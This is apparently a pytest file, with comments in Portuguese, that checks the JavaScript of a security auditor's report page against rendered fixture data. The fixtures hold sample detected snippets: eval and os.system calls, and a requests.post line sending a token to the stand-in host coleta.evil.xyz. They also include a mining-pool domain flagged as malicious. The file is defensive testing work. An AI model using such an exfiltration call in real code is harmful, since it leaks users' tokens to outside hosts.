"""Testes do JavaScript da interface (app.js) rodando sobre páginas reais do template.

O pytest gera as páginas com ``render_html`` e roda ``node --test tests/js/`` (jsdom simula o
navegador). Precisa de Node 18+ e de ``npm install`` na raiz do repositório; sem isso, é pulado.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

from auditor.models import ComponentSummary, ScanResult, Severity
from auditor.report import render_html
from auditor.scoring import summarize

from .conftest import make_finding

ROOT = Path(__file__).parents[1]
APP_JS = ROOT / "security_auditor/app/auditor/web/static/app.js"


def _needs_node():
    if shutil.which("node") is None:
        pytest.skip("node não instalado")
    if not (ROOT / "node_modules/jsdom").is_dir():
        pytest.skip("jsdom não instalado (rode npm install na raiz do repositório)")


def _result() -> ScanResult:
    findings = [
        make_finding(component="tuya_local", file="custom_components/tuya_local/a.py", line=1, snippet="eval(x)",
                     severity=Severity.HIGH),
        make_finding(component="tuya_local", file="custom_components/tuya_local/b.py", line=2,
                     snippet='requests.post("https://coleta.evil.xyz/up?token=abc")', rule_id="auditor.rede",
                     severity=Severity.MEDIUM),
        make_finding(component="tuya_local", file="custom_components/tuya_local/c.py", line=3, snippet="os.system(y)",
                     rule_id="auditor.shell", severity=Severity.LOW),
        make_finding(component="luzes_sala", file="custom_components/luzes_sala/a.py", line=1, snippet="eval(z)",
                     severity=Severity.HIGH),
    ]
    comps = summarize(findings, {("integracao", "tuya_local"): {}, ("integracao", "luzes_sala"): {},
                                 ("integracao", "clima_limpa"): {}})
    domains = ["api.fabricante.com", "pool.supportxmr.com", "k8f2j9x7q1m4z6v3b5n0p2r8t4.example.org",
               "ads.rastreador.com", "ja.ignorado.com"]
    comps.append(ComponentSummary(name="dns", component_type="rede", metadata={
        "dominios": [{"dominio": d, "consultas": 1, "bloqueadas": 0, "novo": False, "servidores": ["AdGuard"],
                      "descoberto": "2026-11-18T10:00:00+00:00", "ultima": None} for d in domains],
        "dominios_total": len(domains), "clientes": ["192.168.1.10"], "servidores": ["AdGuard"]}))
    return ScanResult(scan_id="20261118T100000000000Z", started_at="2026-11-18T10:00:00+00:00",
                      finished_at="2026-11-18T10:01:00+00:00", status="concluida", findings=findings, components=comps)


def _page(result: ScanResult) -> str:
    ignored = [{"id": 1, "component": "luzes_sala", "rule": "auditor.eval-dinamico", "path": None,
                "fingerprint": None, "severities": [], "title": None, "reason": "revisado",
                "created_at": "2026-11-18T10:00:00+00:00", "skip": False, "fingerprints": []},
               {"id": 2, "component": "*", "rule": "auditor.integridade.*", "path": None, "fingerprint": None,
                "severities": [], "title": None, "reason": "sem repositório", "created_at": "2026-11-18T10:00:00+00:00",
                "skip": False, "fingerprints": []}]
    dns_ignored = [{"id": 5, "pattern": "ja.ignorado.com", "reason": "conhecido", "created_at": "2026-11-18"}]
    return render_html(result, status={"dns": {"configurado": True, "testando": False, "resultados": []}},
                       history=[], csrf_token="tok", lang="pt", ignored=ignored, dns_ignored=dns_ignored,
                       ai={"label": "Claude", "modelo": "claude-opus-5-5"},
                       dns_ai={"pool.supportxmr.com": {"veredito": "malicioso", "explicacao": "x", "provedor": "claude",
                                                       "modelo": "claude-opus-5-5", "idioma": "pt", "data": "2026-11-18"}})


def test_interface_javascript(tmp_path):
    _needs_node()
    result = _result()
    fp = {f.rule_id: f.fingerprint for f in result.findings if f.component == "tuya_local"}
    (tmp_path / "pagina.html").write_text(_page(result), encoding="utf-8")
    (tmp_path / "dados.json").write_text(json.dumps({"fingerprints": fp}), encoding="utf-8")
    env = {**os.environ, "UI_PAGE": str(tmp_path / "pagina.html"), "UI_DATA": str(tmp_path / "dados.json"),
           "UI_APP_JS": str(APP_JS)}
    proc = subprocess.run(["node", "--test", "tests/js/"], cwd=ROOT, env=env, capture_output=True, text=True, check=False,
                          timeout=120)
    assert proc.returncode == 0, proc.stdout[-6000:] + proc.stderr[-3000:]
